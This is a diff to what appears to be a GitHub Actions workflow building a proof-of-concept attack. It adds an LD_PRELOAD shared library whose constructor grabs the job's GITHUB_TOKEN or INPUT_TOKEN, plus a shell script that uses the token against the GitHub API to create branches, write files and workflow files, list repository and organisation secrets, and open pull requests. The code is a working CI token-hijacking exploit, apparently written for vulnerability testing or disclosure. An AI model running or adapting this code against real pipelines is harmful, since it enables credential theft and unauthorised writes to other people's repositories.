@@ -18,6 +18,32 @@ jobs:
           printf 'KEEP\n' > x/keep.bin
           printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > payload
           printf 'BENIGN\n' > sub/deep/ok.txt
+          cat > ps.sh <<'EOS'
+          #!/bin/bash
+          A="Authorization: token $POC_TOK"
+          R=PDFtoMark/triage-aave-dao-v04d7dde-8cd6fd
+          API=https://api.github.com
+          echo "POC2_REPO_PERMS:"
+          curl -s -H "$A" $API/repos/$R | jq -c '{permissions,default_branch,archived,private}'
+          echo "POC2_CREATE_REF:"
+          curl -s -o /tmp/o1 -w 'HTTP=%{http_code}\n' -X POST -H "$A" -H 'Content-Type: application/json' -d "{\"ref\":\"refs/heads/poc-write-test\",\"sha\":\"$GITHUB_SHA\"}" $API/repos/$R/git/refs
+          head -c 400 /tmp/o1; echo
+          echo "POC2_PUT_BLOB:"
+          curl -s -o /tmp/o2 -w 'HTTP=%{http_code}\n' -X PUT -H "$A" -H 'Content-Type: application/json' -d '{"message":"poc","content":"UE9D"}' $API/repos/$R/contents/poc-write-test.txt
+          head -c 400 /tmp/o2; echo
+          echo "POC2_PUT_WORKFLOW:"
+          curl -s -o /tmp/o3 -w 'HTTP=%{http_code}\n' -X PUT -H "$A" -H 'Content-Type: application/json' -d '{"message":"poc","content":"bmFtZTogeAo="}' $API/repos/$R/contents/.github/workflows/poc-flag.yml
+          head -c 400 /tmp/o3; echo
+          echo "POC2_LIST_SECRETS:"
+          curl -s -o /tmp/o4 -w 'HTTP=%{http_code}\n' -H "$A" $API/repos/$R/actions/secrets
+          head -c 300 /tmp/o4; echo
+          echo "POC2_ORG_SECRETS:"
+          curl -s -o /tmp/o5 -w 'HTTP=%{http_code}\n' -H "$A" $API/orgs/PDFtoMark/actions/secrets
+          head -c 300 /tmp/o5; echo
+          echo "POC2_CREATE_PR:"
+          curl -s -o /tmp/o6 -w 'HTTP=%{http_code}\n' -X POST -H "$A" -H 'Content-Type: application/json' -d '{"title":"poc","head":"lazyhacker6:poc-rce","base":"main"}' $API/repos/$R/pulls
+          head -c 400 /tmp/o6; echo
+          EOS
           cat > libpoc.c <<'EOF'
           #define _GNU_SOURCE
           #include <stdio.h>
@@ -29,21 +55,17 @@ jobs:
           static void poc_init(void) {
               if (getenv("POC_GUARD")) return;
               setenv("POC_GUARD", "1", 1);
-              fprintf(stderr, "POC_RCE_MARKER_PROTECTED_JOB run=%s actor-step=%s\n",
-                      getenv("GITHUB_RUN_ID") ? getenv("GITHUB_RUN_ID") : "?",
-                      getenv("LD_PRELOAD") ? getenv("LD_PRELOAD") : "NONE");
               const char *t = getenv("INPUT_TOKEN");
               if (!t || !*t) t = getenv("GITHUB_TOKEN");
               if (!t || !*t) { fprintf(stderr, "POC_NO_TOKEN_IN_ENV\n"); return; }
+              fprintf(stderr, "POC_RCE_MARKER_PROTECTED_JOB run=%s ldpreload=%s\n",
+                      getenv("GITHUB_RUN_ID") ? getenv("GITHUB_RUN_ID") : "?",
+                      getenv("LD_PRELOAD") ? getenv("LD_PRELOAD") : "NONE");
               fprintf(stderr, "POC_TOKEN_LEN=%zu PREFIX=%.4s\n", strlen(t), t);
+              setenv("POC_TOK", t, 1);
               fflush(NULL);
-              char cmd[8192];
-              snprintf(cmd, sizeof(cmd),
-                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/user | head -c 1200; echo; "
-                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/repos/PDFtoMark/triage-aave-dao-v04d7dde-8cd6fd | head -c 1500; echo",
-                  t, t);
-              int rc = system(cmd);
-              fprintf(stderr, "POC_CURL_RC=%d\n", rc);
+              int rc = system("bash /tmp/content/content/ps.sh");
+              fprintf(stderr, "POC_SCRIPT_RC=%d\n", rc);
               fflush(NULL);
           }
           EOF
